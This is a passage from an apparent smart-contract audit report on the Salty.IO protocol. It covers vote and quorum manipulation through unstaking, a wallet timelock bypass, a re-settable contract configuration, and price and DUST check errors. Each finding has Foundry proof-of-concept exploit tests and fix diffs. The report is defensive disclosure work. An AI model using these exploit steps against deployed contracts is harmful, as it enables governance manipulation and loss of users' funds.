- She unstakes her xSalt providing a duration of `StakingConfig.minUnstakeWeeks` which is 2 weeks
- Alice receives part of her salt after 2 weeks equalling an amount of 130,000
- She transfers this salt to Bob, which is just another wallet of hers
- Bob stakes 130,000 salt and votes `yes`
- Thus, Alice increased her voting power and the total count of `yes` votes now is 650,000 + 130,000 = 780,000

## Proof of Concept
Add the following tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_unstakingManipulates` to see both the tests pass:
```js
	function test_unstakingManipulatesQuorum() public {
        deal(address(salt), address(DEPLOYER), 6_000_000 ether);
		vm.prank(DEPLOYER);
        staking.stakeSALT(6_000_000 ether);
        
        // Set up the parameters for the proposal
        uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
        uint256 ballotID = 1;

        // Alice stakes her SALT to get voting power
		uint256 aliceStakedAmount = 650_000 ether;
        deal(address(salt), address(alice), aliceStakedAmount);

        vm.startPrank(alice);
        staking.stakeSALT(aliceStakedAmount);

        // Propose a parameter ballot
        proposals.proposeParameterBallot(proposalNum, "Increase max pools count");

		// Alice casts a vote, but not enough for quorum
        proposals.castVote(ballotID, Vote.INCREASE);
		vm.stopPrank();

		skip(11 days);

        // Expect revert because quorum has not yet been reached and do a premature finalization attempt
        // minQuorum required = 10% of (6_000_000 + 650_000) ether = 665_000 ether
        vm.expectRevert("The ballot is not yet able to be finalized");
        dao.finalizeBallot(ballotID);

		// Alice unstakes her SALT
		vm.prank(alice);
		staking.unstake(aliceStakedAmount, 52);

        // Now it should be possible to finalize the ballot without reverting
        // @audit : minQuorum required now = 10% of (6_000_000) ether = 600_000 ether and since Alice had already casted 650_000 votes, so this will pass
        dao.finalizeBallot(ballotID);
        // Check that the ballot is finalized
        bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
        assertTrue(isBallotFinalized);
    }
    
	function test_unstakingManipulatesVotingPower() public {
		// @audit-info : Pre-requisite for the attack `StakingConfig.minUnstakeWeeks <= ballotMinimumDuration`. Either
		// increase `ballotMinimumDuration` to 14 days OR decrease `StakingConfig.minUnstakeWeeks` to 1 week.
		vm.startPrank( address(dao) );
		daoConfig.changeBallotDuration(true);
		daoConfig.changeBallotDuration(true);
		daoConfig.changeBallotDuration(true);
		daoConfig.changeBallotDuration(true);
		assertEq(daoConfig.ballotMinimumDuration(), 14 days, "ballot duration != 14 days");
		vm.stopPrank();

        deal(address(salt), address(DEPLOYER), 6_000_000 ether);
		vm.prank(DEPLOYER);
        staking.stakeSALT(6_000_000 ether);
        
        // Set up the parameters for the proposal
        uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
        uint256 ballotID = 1;

        // Alice stakes her SALT to get voting power
		uint256 aliceStakedAmount = 650_000 ether;
        deal(address(salt), address(alice), aliceStakedAmount);

        vm.startPrank(alice);
        staking.stakeSALT(aliceStakedAmount);
        // Propose a parameter ballot
        proposals.proposeParameterBallot(proposalNum, "Increase max pools count");
		// Alice casts a vote, but not enough for quorum
        // minQuorum required = 10% of (6_000_000 + 650_000) ether = 665_000 ether
        proposals.castVote(ballotID, Vote.INCREASE);
		assertEq(proposals.votesCastForBallot(ballotID, Vote.INCREASE), aliceStakedAmount);
		vm.stopPrank();

		// Following activities done before anyone calls `finalizeBallot()`
		// Alice partially unstakes her SALT
		vm.startPrank(alice);
		uint256 unstakeID = staking.unstake(aliceStakedAmount, 2); // Alice will receive 130_000 ether of salt back
		skip(14 days);
		staking.recoverSALT(unstakeID); // Alice will receive 130_000 ether of salt back
		salt.transfer(address(bob), 130_000 ether); // Alice transfers the salt to Bob
		vm.stopPrank();
		
		// Bob stakes and casts vote
		vm.startPrank(bob);
		salt.approve(address(staking), 130_000 ether);
		staking.stakeSALT(130_000 ether);
        proposals.castVote(ballotID, Vote.INCREASE);
		vm.stopPrank();
		assertEq(proposals.votesCastForBallot(ballotID, Vote.INCREASE), aliceStakedAmount + 130_000 ether); // @audit : votes incremented
    }
```

## Tools used
Foundry

## Recommended Mitigation Steps
- The protocol could add a constraint that any one who has voted in an active ballot shouldn't be able to unstake until that ballot is no more live.
- It may also make sense to store the snapshot of total staked values and voting powers when the proposal is introduced and use those values instead of the live figures.


<br><br>

## **MEDIUM-SEVERITY BUGS**
---

### <a id="m-01"></a>[M-01]
## **changeWallets() can be confirmed immediately after proposalWallets() by manipulating activeTimelock beforehand**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L59-L69
<br>

## Impact
`ManagedWallet.sol` [states](https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L7-L10) that:
```text
// A smart contract which provides two wallet addresses (a main and confirmation wallet) which can be changed using the following mechanism:
// 1. Main wallet can propose a new main wallet and confirmation wallet.
// 2. Confirmation wallet confirms or rejects.
// 3. There is a timelock of 30 days before the proposed mainWallet can confirm the change.
```

However, the current 30-day wait period can be bypassed.
<br>

The expected order by the protocol is:
1. `proposeWallets()` is called by `mainWallet`.
2. To confirm the proposal, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
3. `proposedMainWallet` calls `changeWallets()` after 30 days and the new wallet addresses are set.

To bypass the 30-day limitation, the following flow can be used:
1. Even with no propsal for a change existing, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
2. Just as 30 days pass, 
    - `proposeWallets()` is called by `mainWallet`
    - Immediately, with no delay whatsoever, `proposedMainWallet` calls `changeWallets()`
3. The new wallet addresses are successfully assigned.

**Impact:** Although the users believe that any changes to wallet address is going to have a timelock of 30 days as promised by the protocol, it really can be bypassed by the current admins/wallet addresses. This breaks the intended functionality implmentation.

## Proof of Concept
Add the following inside `2024-01-salty/src/root_tests/ManagedWallet.t.sol` and run with `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.sepolia.org/ --mt test_ManipulateActiveTimeLockBeforeProposingNewWallets`:
```js
    function test_ManipulateActiveTimeLockBeforeProposingNewWallets() public {
        // Set up the initial state with main and confirmation wallets
        address initialMainWallet = alice;
        address initialConfirmationWallet = address(0x2222);
        ManagedWallet managedWallet = new ManagedWallet(initialMainWallet, initialConfirmationWallet);

        // Set up the proposed main and confirmation wallets
        address newMainWallet = address(0x3333);
        address newConfirmationWallet = address(0x4444);

        // @audit : Even before any proposal exists, prank as the current confirmation wallet and send ether to start the TIMELOCK_DURATION 
        uint256 sentValue = 0.05 ether;
        vm.prank(initialConfirmationWallet);
        vm.deal(initialConfirmationWallet, sentValue);
        (bool success,) = address(managedWallet).call{value: sentValue}("");
        assertTrue(success, "Confirmation of wallet proposal failed");

        // Warp the blockchain time to the future beyond the active timelock period
        uint256 currentTime = block.timestamp;
        vm.warp(currentTime + TIMELOCK_DURATION);

        // Prank as the initial main wallet to propose the new wallets
        vm.startPrank(initialMainWallet);
        managedWallet.proposeWallets(newMainWallet, newConfirmationWallet);
        vm.stopPrank();

        // @audit : With NO DELAY, immediately prank as the new proposed main wallet which should now be allowed to call changeWallets
        vm.prank(newMainWallet);
        managedWallet.changeWallets();

        // Check that the mainWallet and confirmationWallet state variables are updated
        assertEq(managedWallet.mainWallet(), newMainWallet, "mainWallet was not updated correctly");
        assertEq(managedWallet.confirmationWallet(), newConfirmationWallet, "confirmationWallet was not updated correctly");

        // Check that the proposed wallets and activeTimelock have been reset
        assertEq(managedWallet.proposedMainWallet(), address(0), "proposedMainWallet was not reset");
        assertEq(managedWallet.proposedConfirmationWallet(), address(0), "proposedConfirmationWallet was not reset");
        assertEq(managedWallet.activeTimelock(), type(uint256).max, "activeTimelock was not reset to max uint256");
    }
```

## Tools used
Foundry

## Recommended Mitigation Steps
Inside `receive()` make sure an active proposal exists:
```diff
    receive() external payable
    	{
    	require( msg.sender == confirmationWallet, "Invalid sender" );
+       require( proposedMainWallet != address(0), "Cannot manipulate activeTimelock without active proposal" );

		// Confirm if .05 or more ether is sent and otherwise reject.
		// Done this way in case custodial wallets are used as the confirmationWallet - which sometimes won't allow for smart contract calls.
    	if ( msg.value >= .05 ether )
    		activeTimelock = block.timestamp + TIMELOCK_DURATION; // establish the timelock
    	else
			activeTimelock = type(uint256).max; // effectively never
        }
```

---

### <a id="m-02"></a>[M-02]
## **`confirmationWallet` can cause `activeTimelock` to be further delayed if approving an already approved proposal**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L59-L69
<br>

## Impact
Contract `ManagedWallet.sol` [states that](https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L7-L10):
```text
// A smart contract which provides two wallet addresses (a main and confirmation wallet) which can be changed using the following mechanism:
// 1. Main wallet can propose a new main wallet and confirmation wallet.
// 2. Confirmation wallet confirms or rejects.
// 3. There is a timelock of 30 days before the proposed mainWallet can confirm the change.
```

However, there is no check to stop `confirmationWallet` from approving an already approved proposal. This needs to be avoided as an accidental action because re-approving causes the `activeTimelock` to be pushed further into the future i.e. greater than 30 days.
<br>

The expected order of events by the protocol is:
1. `proposeWallets()` is called by `mainWallet`.
2. To confirm the proposal, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
3. `proposedMainWallet` calls `changeWallets()` after 30 days and the new wallet addresses are set.

Now consider the following flow:
1. `proposeWallets()` is called by `mainWallet`.
2. On `t+0 day`, to confirm the proposal, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. `t+30 days`.
3. On `t+15 days`, `confirmationWallet` inadvertently sends 0.05 ether again which causes `activeTimelock` to move to `t+45 days`, unnecessarily delaying the change of wallet addresses.

Hence, I recommend that an already approved proposal be not allowed to be approved again.<br>
**Note that** even if we consider that the protocol wants to give the freedom of pushing `activeTimelock` again & again into the future via multiple-approvals, it is much better to do so in the following manner (already supported by the current implementation):
- a. Give 1st approval.
- b. After `X` days (X is any value less than 30), if `confirmationWallet` wishes to push this further into the future, then:
    - Reject the proposal by sending `0 ether` to the contract
    - Give 2nd approval

This is better because in the current design if an already approved proposal's `activeTimelock` is delayed inadvertently by `confirmationWallet` through re-approval, **then there is no way to reset it to the previous value**.

## Proof of Concept
Add the following inside `src/root_tests/ManagedWallet.t.sol` and run with `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.sepolia.org/ --mt test_MultipleApprovalsCauseIncrementalDelays`:
```js
	function test_MultipleApprovalsCauseIncrementalDelays() public {
        // Set up the initial state with main and confirmation wallets
        address initialMainWallet = alice;
        address initialConfirmationWallet = address(0x2222);
        ManagedWallet managedWallet = new ManagedWallet(initialMainWallet, initialConfirmationWallet);

        // Set up the proposed main and confirmation wallets
        address newMainWallet = address(0x3333);
        address newConfirmationWallet = address(0x4444);

        // Prank as the initial main wallet to propose the new wallets
        vm.startPrank(initialMainWallet);
        managedWallet.proposeWallets(newMainWallet, newConfirmationWallet);
        vm.stopPrank();

        // Prank as the current confirmation wallet and send ether to confirm the proposal
        uint256 sentValue = 0.05 ether;
        vm.prank(initialConfirmationWallet);
        vm.deal(initialConfirmationWallet, sentValue);
        (bool success,) = address(managedWallet).call{value: sentValue}("");
        assertTrue(success, "Confirmation of wallet proposal failed");
        
        // Warp the blockchain time to +15 days
        uint256 startTime = block.timestamp;
        vm.warp(startTime + 15 days);

        // confirm the proposal once more
        vm.prank(initialConfirmationWallet);
        vm.deal(initialConfirmationWallet, sentValue);
        (success,) = address(managedWallet).call{value: sentValue}("");
        assertTrue(success, "Confirmation of wallet proposal failed");

        // Warp the blockchain time to 30 days from the 1st approval
        vm.warp(startTime + 30 days);

        // Expect revert 
        vm.expectRevert("Timelock not yet completed");
        vm.prank(newMainWallet);
        managedWallet.changeWallets();

        // Warp the blockchain time to another 15 days i.e. 30 days from the 2nd approval
        vm.warp(startTime + 45 days);

        // Should pass now
        vm.prank(newMainWallet);
        managedWallet.changeWallets();

        // Check that the mainWallet and confirmationWallet state variables are updated
        assertEq(managedWallet.mainWallet(), newMainWallet, "mainWallet was not updated correctly");
        assertEq(managedWallet.confirmationWallet(), newConfirmationWallet, "confirmationWallet was not updated correctly");

        // Check that the proposed wallets and activeTimelock have been reset
        assertEq(managedWallet.proposedMainWallet(), address(0), "proposedMainWallet was not reset");
        assertEq(managedWallet.proposedConfirmationWallet(), address(0), "proposedConfirmationWallet was not reset");
        assertEq(managedWallet.activeTimelock(), type(uint256).max, "activeTimelock was not reset to max uint256");
    }
```

## Tools used
Foundry

## Recommended Mitigation Steps
Inside `receive()` make sure we are not approving an already approved proposal by checking the current value of `activeTimelock`:
```diff
    receive() external payable
    	{
    	require( msg.sender == confirmationWallet, "Invalid sender" );

		// Confirm if .05 or more ether is sent and otherwise reject.
		// Done this way in case custodial wallets are used as the confirmationWallet - which sometimes won't allow for smart contract calls.
    	if ( msg.value >= .05 ether )
+       {
+         if ( activeTimelock == type(uint256).max )  
    		activeTimelock = block.timestamp + TIMELOCK_DURATION; // establish the timelock
+       }
    	else
			activeTimelock = type(uint256).max; // effectively never
        }
```

---

### <a id="m-03"></a>[M-03]
## **setContracts() can be called multiple times allowing owner to set addresses more than once**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/ExchangeConfig.sol#L51
<br>

## Impact
Contract `ExchangeConfig.sol` states that the following variables can be [set only once](https://github.com/code-423n4/2024-01-salty/blob/main/src/ExchangeConfig.sol#L24-L31):
```js
	IDAO public dao; // can only be set once
	IUpkeep public upkeep; // can only be set once
	IInitialDistribution public initialDistribution; // can only be set once
	IAirdrop public airdrop; // can only be set once

	// Gradually distribute SALT to the teamWallet and DAO over 10 years
	VestingWallet public teamVestingWallet;		// can only be set once
	VestingWallet public daoVestingWallet;		// can only be set once
```

It enforces this by the following check inside [setContracts()](https://github.com/code-423n4/2024-01-salty/blob/main/src/ExchangeConfig.sol#L51):
```js
        // setContracts is only called once (on deployment)
		require( address(dao) == address(0), "setContracts can only be called once" );
```

However, this check is not sufficient. The owner can -
1. Make the first call to `setContracts()` with `_dao` address as `address(0)`. He can set the other addresses to some initial value. For example, set `upkeep` to `address(0x2)`.
2. He can then later call `setContracts()` again. Since `dao` address is still zero, the `require` statement will pass and he can choose to reassign `upkeep` (& other variables) to `address(0x99)`.

This bypasses the intended functionality.

## Proof of Concept
Add the following inside `src/root_tests/ExchangeConfig.t.sol` and run with `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.sepolia.org/ --mt test_SetContractsCalledMoreThanOnce`:
```js
	function test_SetContractsCalledMoreThanOnce() public {
        // Arrange: Deploy the contract and setup contracts for the first time
        vm.prank(address(this));
        ExchangeConfig exchangeConfig = new ExchangeConfig(salt, wbtc, weth, dai, usds, managedTeamWallet);

        IDAO mockDao = IDAO(address(0));
        IUpkeep mockUpkeep = IUpkeep(address(0x2));
        IInitialDistribution mockInitialDistribution = IInitialDistribution(address(0x3));
        IAirdrop mockAirdrop = IAirdrop(address(0x4));

        // @audit : Call setContracts for the first time with `dao` as address(0)
        exchangeConfig.setContracts(mockDao, mockUpkeep, mockInitialDistribution, mockAirdrop, teamVestingWallet, daoVestingWallet);

        // @audit : Calling setContracts again does not revert and allows changing the `upkeep` address to a new one
        exchangeConfig.setContracts(mockDao, IUpkeep(address(0x99)), mockInitialDistribution, mockAirdrop, teamVestingWallet, daoVestingWallet);
    }
```

## Tools used
Foundry

## Recommended Mitigation Steps
Apply the following patch to add a boolean variable which keeps track of the first call of `setContracts()`:
```diff
diff --git a/src/ExchangeConfig.sol b/src/ExchangeConfig.sol
index ca63f13..050e023 100644
--- a/src/ExchangeConfig.sol
+++ b/src/ExchangeConfig.sol
@@ -32,6 +32,8 @@ contract ExchangeConfig is IExchangeConfig, Ownable
 
 	IAccessManager public accessManager;
 
+	bool isAlreadySet;
+
 
 	constructor( ISalt _salt, IERC20 _wbtc, IERC20 _weth, IERC20 _dai, IUSDS _usds, IManagedWallet _managedTeamWallet )
 		{
@@ -48,7 +50,8 @@ contract ExchangeConfig is IExchangeConfig, Ownable
 	function setContracts( IDAO _dao, IUpkeep _upkeep, IInitialDistribution _initialDistribution, IAirdrop _airdrop, VestingWallet _teamVestingWallet, VestingWallet _daoVestingWallet ) external onlyOwner
 		{
 		// setContracts is only called once (on deployment)
-		require( address(dao) == address(0), "setContracts can only be called once" );
+		require( !isAlreadySet, "setContracts can only be called once" );
+		isAlreadySet = true;
 
 		dao = _dao;
 		upkeep = _upkeep;

```

Also, in this context, it would be better to add the explicit check that `dao` is not being set to `address(0)` by mistake.

---

### <a id="m-04"></a>[M-04]
## **Incorrect calculation to check if difference in price feeds is within the `maximumPriceFeedPercentDifferenceTimes1000` range**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/PriceAggregator.sol#L142
<br>

## Impact
Contract `PriceAggregator.sol` states the following about the maximum percent difference between two price feeds:<br>
[PriceAggregator.sol#L26-L29](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/PriceAggregator.sol#L26-L29)
```js
	// The maximum percent difference between two non-zero PriceFeed prices when aggregating price.
	// When the two closest PriceFeeds (out of the three) have prices further apart than this the aggregated price is considered invalid.
	// Range: 1% to 7% with an adjustment of .50%
	uint256 public maximumPriceFeedPercentDifferenceTimes1000 = 3000; // Defaults to 3.0% with a 1000x multiplier
```

Which in plain words means:
- If the 2 closest price feeds are say, `priceA = 200000` and `priceB = 206050`, then this should be considered invalid and price returned as `0`.
- Invalid because the percentage difference in price feeds is `(206050 - 200000) / 200000 = 3.025%` which is greater than `maximumPriceFeedPercentDifferenceTimes1000` of `3%`. **Note** that the terms `"maximum percent difference between two non-zero PriceFeed prices"` and `"further apart"` used by the protocol in the comment section imply the distance between the two prices themselves, **not** their distance from some other point in the middle.

However, this logic is not correctly implemented. The current code does this:<br>
[PriceAggregator.sol#L139-L143](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/PriceAggregator.sol#L139-L143):
```js
		uint256 averagePrice = ( priceA + priceB ) / 2;

		// If price sources are too far apart then return zero to indicate failure
		if (  (_absoluteDifference(priceA, priceB) * 100000) / averagePrice > maximumPriceFeedPercentDifferenceTimes1000 )
			return 0;
```

Instead of calculating the percentage deviation from the lower of the two prices, it calculates it from the mid-point (average). **This effectively means the protocol is allowing a greater margin of error than it hoped for**.<br>
Let's see the above numeric example once again, when passed through this logic:
- Suppose the 2 closest price feeds are, `priceA = 200000` and `priceB = 206050`
- `_absoluteDifference(priceA, priceB) = 206050 - 200000 = 6050`
- `averagePrice = (200000 + 206050) / 2 = 203025`
- Since `6050 / 203025 = 2.97992%`, this is accepted as it's less than `3%`. It should not have been. 
<br>

Further evidence to support the fact that the protocol dev actually wanted to calculate the percentage price difference between `priceA` and `priceB` instead of from the mean price can be seen in the pre-existing unit test:<br>
[PriceAggregator.t.sol#L228-L235](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/tests/PriceAggregator.t.sol#L228-L235):
```js
    // A unit test that confirms _aggregatePrices correctly averages the two closest prices when the closest two prices are exactly at the maximum allowed difference apart
    function testAggregatePricesMaxDifference() public {
        // Setup
        uint256 price1 = 100 ether; // Initial price for feed1
        uint256 price2 = 100 ether + 3 ether; // Price for feed2, at max allowed difference
        uint256 price3 = 0; // Price for feed3 is irrelevant as it should be discarded

        // Set prices for price feeds with the maximum allowed difference
        priceFeed1.setBTCPrice(price1);
        priceFeed2.setBTCPrice(price2);
        priceFeed3.setBTCPrice(price3);

        // Expect that _aggregatePrices correctly averages the two closest prices
        uint256 expectedPrice = (price1 + price2) / 2;
        uint256 aggregatedPrice = priceAggregator.getPriceBTC();

        // Check that the average is correctly calculated
        assertEq(aggregatedPrice, expectedPrice, "Aggregated price did not match expected average");
    }
```

Notice how the **_"max allowed difference"_** price has been configured as 3% (3 ether) away from 100 ether, and has been clearly mentioned multiple times, not realizing that the test would have passed incorrectly even with:
```diff
-        uint256 price2 = 100 ether + 3 ether; // Price for feed2, at max allowed difference
+        uint256 price2 = 100 ether + 3.03 ether; // Price for feed2, at max allowed difference
```
This makes it obvious that the code implementation is flawed.

## Proof of Concept
Add the following inside `src/price_feed/tests/PriceAggregator.t.sol` and run with `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.sepolia.org/ --mt test_IncorrectPriceDifference`:
```js
    function test_IncorrectPriceDifference() public {
        // Setup
        priceFeed1.setBTCPrice(200000 ether);  
        priceFeed2.setBTCPrice(206050 ether);  
        priceFeed3.setBTCPrice(300000 ether);  // Different price for priceFeed3

        // @audit : actual difference is higher than 3%:
        uint256 actualDifference = (206050 ether - 200000 ether) * 100000 / 200000e18;
        assertGt(actualDifference, 3000, "Difference < 3%");

        // @audit : However, the price feeds are still accepted
        uint256 aggregatedPrice = priceAggregator.getPriceBTC();
        assertGt(aggregatedPrice, 0, "Aggregated price returned as 0");
    }
```

## Tools used
Foundry

## Recommended Mitigation Steps
```diff
	function _aggregatePrices( uint256 price1, uint256 price2, uint256 price3 ) internal view returns (uint256)
		{
		uint256 numNonZero;

		if (price1 > 0)
			numNonZero++;

		if (price2 > 0)
			numNonZero++;

		if (price3 > 0)
			numNonZero++;

		// If less than two price sources then return zero to indicate failure
		if ( numNonZero < 2 )
			return 0;

		uint256 diff12 = _absoluteDifference(price1, price2);
		uint256 diff13 = _absoluteDifference(price1, price3);
		uint256 diff23 = _absoluteDifference(price2, price3);

		uint256 priceA;
		uint256 priceB;

		if ( ( diff12 <= diff13 ) && ( diff12 <= diff23 ) )
			(priceA, priceB) = (price1, price2);
		else if ( ( diff13 <= diff12 ) && ( diff13 <= diff23 ) )
			(priceA, priceB) = (price1, price3);
		else if ( ( diff23 <= diff12 ) && ( diff23 <= diff13 ) )
			(priceA, priceB) = (price2, price3);

		uint256 averagePrice = ( priceA + priceB ) / 2;
+       uint256 lowerPrice = priceA < priceB? priceA : priceB;

		// If price sources are too far apart then return zero to indicate failure
-		if (  (_absoluteDifference(priceA, priceB) * 100000) / averagePrice > maximumPriceFeedPercentDifferenceTimes1000 )
+		if (  (_absoluteDifference(priceA, priceB) * 100000) / lowerPrice > maximumPriceFeedPercentDifferenceTimes1000 )
			return 0;

		return averagePrice;
		}
```

---

### <a id="m-05"></a>[M-05]
## **removeLiquidity() can result in reserve1 to go below DUST**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L187
<br>

## Impact
[removeLiquidity()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L185-L187) has the following code snippet to ensure that reserve0 and reserve1 do not go below DUST:
```js
  185:		// Make sure that removing liquidity doesn't drive either of the reserves below DUST.
  186:		// This is to ensure that ratios remain relatively constant even after a maximum withdrawal.
  187:        require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve0 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```

As can be seen, L187 has a typo where reserve0 is checked twice and reserve1 is completely omitted. Hence, reserve1 can be driven below the DUST threshold and the ratios may not remain constant after a call to removeLiquidity() is made.

## Proof of Concept
https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L187

## Tools used
Manual inspection

## Recommended Mitigation Steps
```diff
  185:		// Make sure that removing liquidity doesn't drive either of the reserves below DUST.
  186:		// This is to ensure that ratios remain relatively constant even after a maximum withdrawal.
- 187:        require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve0 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
+ 187:        require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve1 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```

---

### <a id="m-06"></a>[M-06]
## **Incorrect check for DUST threshold in withdraw()**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L222
<br>

## Impact
[deposit()#L207](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L207) has the following code snippet to ensure that the balance after deposit remains above DUST:
```js
	// Allow users to deposit tokens into the contract.
	// This is not rewarded or considered staking in any way.  It's simply a way to reduce gas costs by preventing transfers at swap time.
	function deposit( IERC20 token, uint256 amount ) external nonReentrant
		{
@---->  require( amount > PoolUtils.DUST, "Deposit amount too small");

		_userDeposits[msg.sender][token] += amount;

		// Transfer the tokens from the sender - only tokens without fees should be whitelsited on the DEX
		token.safeTransferFrom(msg.sender, address(this), amount );

		emit TokenDeposit(msg.sender, token, amount);
		}
```

The `require` statement in the above code snippet makes perfect sense. The protocol then proceeds to apply a similar check inside the `withdraw()` function:<br>
[withdraw()#L222](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L222):
```js
	// Withdraw tokens that were previously deposited
    function withdraw( IERC20 token, uint256 amount ) external nonReentrant
    	{
    	require( _userDeposits[msg.sender][token] >= amount, "Insufficient balance to withdraw specified amount" );
@-----> require( amount > PoolUtils.DUST, "Withdraw amount too small");

		_userDeposits[msg.sender][token] -= amount;

    	// Send the token to the user
    	token.safeTransfer( msg.sender, amount );

    	emit TokenWithdrawal(msg.sender, token, amount);
    	}
```

The `require` statement here however makes little sense, and does little to protect against the balance dipping below DUST after a withdraw action. Consider this:
- Let's consider value of DUST = 100
- Alice calls `deposit()` with `amount = 105`
- She then calls `withdraw()` with `amount = 101`
- Balance of token left is now `105 - 101 = 4` which is less than the DUST amount.

The `require` condition needs to be amended as per the suggestion made in the section _Recommended Mitigation Steps_ below.

## Proof of Concept
Add the following inside `src/pools/tests/Pools.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_DUSTafterWithdraw` to see it pass:
```js
	function test_DUSTafterWithdraw() public
    	{
		address anyone = address(0x1111);
		vm.startPrank( anyone );
		IERC20 someToken = new TestERC20("SOME", 18);
		someToken.approve( address(pools), type(uint256).max );
    	
		pools.deposit(someToken, 105);
    	pools.withdraw(someToken, 101);

    	assertLt(someToken.balanceOf(address(pools)), PoolUtils.DUST, "pool balance > DUST");
    	assertLt(pools.depositedUserBalance(anyone, someToken), PoolUtils.DUST, "user balance > DUST");
    	}
```

## Tools used
Foundry

## Recommended Mitigation Steps
Amend the `require` check inside `withdraw()`. This will allow withdrawal of either the full amount or an amount which keeps the balance above DUST threshold:
```diff
	// Withdraw tokens that were previously deposited
    function withdraw( IERC20 token, uint256 amount ) external nonReentrant
    	{
    	require( _userDeposits[msg.sender][token] >= amount, "Insufficient balance to withdraw specified amount" );
-       require( amount > PoolUtils.DUST, "Withdraw amount too small");

		_userDeposits[msg.sender][token] -= amount;
+       require( _userDeposits[msg.sender][token] == 0 || _userDeposits[msg.sender][token] > PoolUtils.DUST, "Withdrawal leaves behind dust amount");

    	// Send the token to the user
    	token.safeTransfer( msg.sender, amount );

    	emit TokenWithdrawal(msg.sender, token, amount);
    	}
```

---

### <a id="m-07"></a>[M-07]
## **Incorrect calculation to check remaining ratio after reward in StableConfig.sol**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L51-L54
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L127-L130
<br>

## Impact
[changeMinimumCollateralRatioPercent()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L127-L130) allows the owner to change the `minimumCollateralRatioPercent` while the [changeRewardPercentForCallingLiquidation()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L51-L54) function allows to change the `rewardPercentForCallingLiquidation`. <br>
The protocol aims to maintain a remaining ratio of `105%` as is evident by the comments in these 2 functions:
```js
// Don't decrease the minimumCollateralRatioPercent if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
```
and
```js
// Don't increase rewardPercentForCallingLiquidation if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
```

That is, if borrow amount is `100`, after the calls to any of these two functions, there should be at least `105` collateral remaining which will act as buffer against market volatility.<br>
The current calculation however is incorrect and there is really no direct relationship (_in the way the developer assumes_) between the `rewardPercentForCallingLiquidation` and `minimumCollateralRatioPercent`. Consider this:
- `minimumCollateralRatioPercent` of 110% means that for a borrow amount of `200`, collateral should not go below `220`. This is 110% **_of 200_**.
- However, `rewardPercentForCallingLiquidation` of 5% is calculated on the **_collateral amount_** and NOT the borrowed amount as is evident in the comments too [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L18) and [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L156). So the liquidator will receive `5% of 220` (_let's assume boundary values for rounded calculations_) which is `11`.
- The remaining amount would be `220 - 11 = 209` which is `104.5%` of the borrowed amount. This is less than the 105% the protocol was aiming for. In fact, this figure of `104.5%` goes down further to `103.5%` when `rewardPercentForCallingLiquidation = 5%` and `minimumCollateralRatioPercent = 115%` which is much lower than protocol's buffer target. Not being aware of this risk can cause unexpected loss of funds.

A table outlining the real buffer upper limit values is provided below. Another table showing the actual desirable gap in values is also provided so that the buffer always is above 105%.
<br>

Straightaway, it can be seen that the current default protocol values of 5% and 110% give a buffer of less than 105% and hence either the `minimumCollateralRatioPercent` needs to have a lower limit of `111` instead of 110, or there should be agreement to the fact that `103.5%` is an acceptable `remainingRatio` figure under the current scheme of things.

## Proof of Concept
All figures expressed as **_% of borrowed amount_** i.e. `104.5` means `100` was borrowed.
<br>

Current Implementation:
